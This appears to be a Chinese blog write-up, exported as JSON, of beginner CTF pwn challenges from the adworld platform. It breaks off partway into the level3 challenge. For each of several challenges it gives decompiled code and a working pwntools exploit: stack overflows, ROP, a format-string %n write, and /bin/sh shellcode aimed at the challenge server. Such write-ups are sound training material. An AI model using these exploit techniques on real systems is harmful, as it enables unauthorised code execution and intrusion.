{"title":"攻防世界刷题——新手练习","slug":"攻防世界刷题——新手练习","date":"2019-03-20T08:15:35.000Z","updated":"2019-04-21T02:59:31.207Z","comments":true,"path":"api/articles/攻防世界刷题——新手练习.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"新手练习\"><a href=\"#新手练习\" class=\"headerlink\" title=\"新手练习\"></a>新手练习</h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Birth?\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v5);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"What's Your Name?\"</span>);</span><br><span class=\"line\">    gets(&amp;v4);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"You Are Born In %d\\n\"</span>, v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">1926</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"You Shall Have Flag.\"</span>);</span><br><span class=\"line\">      system(<span class=\"string\">\"cat flag\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./when_did_you_born\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31452</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Birth?\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"123\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What's Your Name?\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">8</span> + <span class=\"string\">\"\\x86\\x07\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"hello-pwn\"><a href=\"#hello-pwn\" class=\"headerlink\" title=\"hello_pwn\"></a>hello_pwn</h2><p>该题跟上一题类似，也是溢出，不过是溢出全局变量。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"~~ welcome to ctf ~~     \"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"lets get helloworld for bof\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;unk_601068, <span class=\"number\">0x10</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( dword_60106C == <span class=\"number\">1853186401</span> )</span><br><span class=\"line\">    sub_400686();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0L</span>L;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./hello_pwn\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31454</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"lets get helloworld for bof\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">4</span> + <span class=\"string\">\"\\x61\\x61\\x75\\x6e\"</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level0\"><a href=\"#level0\" class=\"headerlink\" title=\"level0\"></a>level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/level0_$ checksec level0 </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/level0_/level0&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>同样是栈溢出，同时开启了NX，但是已经布置好system(“/bin/sh”)的函数，直接覆盖eip为0x400596即可。偏移为0x80。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400596                 public callsystem</span><br><span class=\"line\">.text:0000000000400596 callsystem      proc near</span><br><span class=\"line\">.text:0000000000400596 ; __unwind &#123;</span><br><span class=\"line\">.text:0000000000400596                 push    rbp</span><br><span class=\"line\">.text:0000000000400597                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:000000000040059F                 call    _system</span><br><span class=\"line\">.text:00000000004005A4                 pop     rbp</span><br><span class=\"line\">.text:00000000004005A5                 retn</span><br></pre></td></tr></table></figure>\n<p>注意rip后不要再跟多余的padding，否则等callsystem函数返回之后会报错。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level0\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31457</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x88</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Hello, World\\n\"</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level2\"><a href=\"#level2\" class=\"headerlink\" title=\"level2\"></a>level2</h2><p>根据提示可知该题是用ROP，即ret2libc。由于没有开启pie和canary，程序也直接调用了system函数，所以很简单，不需要leak libc基地址。用IDA可以找到/bin/sh字符串，然后用栈传参即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0804A024 hint            db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>\n<p>注意调整栈平衡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level2\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./level2\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31463</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">0x88</span> + <span class=\"number\">4</span></span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(elf.plt[<span class=\"string\">'system'</span>])</span><br><span class=\"line\">rop += <span class=\"string\">\"aaaa\"</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0x804a024</span>)</span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p>该题开启了canary和nx。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/adworld/string$ checksec string </span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/adworld/string/string&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>程序大意是类似一个MUD游戏，输入名字，输入east、up等用命令行与游戏交互，控制主角的行动。</p>\n<p>main函数中会首先malloc一个chunk，然后会leak出chunk的地址（即堆中D和U字符的地址）</p>\n<p>在sub_0x400bb9函数中存在格式化字符串漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">sub_400BB9</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"A voice heard in your mind\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"'Give me an address'\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%ld\"</span>, &amp;v2);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"And, you wish is:\"</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Your wish is\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(&amp;format, &amp;format);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"I hear it, I hear it....\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在最后的sub_0x400ca6函数中，如果之前的D和U两个字符相同，就会直接劫持控制流。此时只需要将shellcode布置到这块堆空间就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( *chunk == chunk[<span class=\"number\">1</span>] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Wizard: I will help you! USE YOU SPELL\"</span>);</span><br><span class=\"line\">    v1 = mmap(<span class=\"number\">0L</span>L, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">33</span>, <span class=\"number\">-1</span>, <span class=\"number\">0L</span>L);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, v1, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (__fastcall *)(_QWORD, <span class=\"keyword\">void</span> *))v1)(<span class=\"number\">0L</span>L, v1);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>所以利用思路是：通过fs漏洞修改已知地址的D和U两个字符为相同值，然后直接读入shellcode。由于程序首先要求我们输入address，可以将要修改的地址先读入栈中，然后利用v2在栈中的相对偏移写入。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\"><span class=\"comment\"># elf = ELF(\"./string\")</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./string\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31504</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"we will tell you two secret ...\\n\"</span>)</span><br><span class=\"line\">addr1 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">addr2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().split(<span class=\"string\">\" \"</span>)[<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr1),hex(addr2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"What should your character's name be:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"So, where you will go?east or up?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"east\"</span>)</span><br><span class=\"line\">offset = <span class=\"number\">7</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"go into there(1), or leave(0)?:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"'Give me an address'\\n\"</span>)</span><br><span class=\"line\">p.sendline(str(addr1))</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"And, you wish is:\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">\"%085d%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-num\"><a href=\"#guess-num\" class=\"headerlink\" title=\"guess_num\"></a>guess_num</h2><p>该题也是栈溢出漏洞的利用，只需要覆盖掉srand函数的随机种子，然后就可以预测出rand()的序列，得到shell。</p>\n<p>预测序列的C程序如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">  srand(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt;= <span class=\"number\">9</span>;++i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num = rand() % <span class=\"number\">6</span> + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, num);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>相应的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">context.arch = <span class=\"string\">'amd64'</span></span><br><span class=\"line\"><span class=\"comment\"># p = process(\"./guess_num\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31574</span>)</span><br><span class=\"line\">numbers = [<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"a\"</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Please input your guess number:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(numbers[i]))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"int-overflow\"><a href=\"#int-overflow\" class=\"headerlink\" title=\"int_overflow\"></a>int_overflow</h2><p>该题开启了NX，没有开启PIE和canary。</p>\n<p>通过整数溢出漏洞溢出v3，过掉输入长度的校验（在3到8之间），顺便修改返回地址。</p>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./int_overflow\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31580</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x0804868B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Your choice:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Please input your username:\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"passwd:\\n\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p.send(<span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + p32(magic) + (<span class=\"number\">262</span> - <span class=\"number\">0x18</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"b\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgpwn2\"><a href=\"#cgpwn2\" class=\"headerlink\" title=\"cgpwn2\"></a>cgpwn2</h2><p>该题是一个常规的栈溢出，构造很短的rop链即可。这里我使用了一条call system指令配合输入到bss段的/bin/sh字符串实现。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804855A                 call    _system</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./cgpwn2\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.198.29.45\"</span>, <span class=\"number\">31688</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"here:\\n\"</span>)</span><br><span class=\"line\">payload = (<span class=\"number\">0x26</span> + <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x804855a</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x0804A080</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level3\"><a href=\"#level3\" class=\"headerlink\" title=\"level3\"></a>level3</h2><p>该题理论上是新手入坑中最难的一题，因为题目没有提供libc文件，并且system不是程序的导入函数，所以必须手动leak libc。注意由于一次溢出劫持控制流并不能完成利用，所以需要在leak libc之后返回到vulnerable function，再次溢出执行system(“/bin/sh”)。这里使用了LibcSearcher（<a href=\"https://github.com/lieanu/LibcSearcher\" target=\"_blank\" rel=\"noopener\">repo地址</a>）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 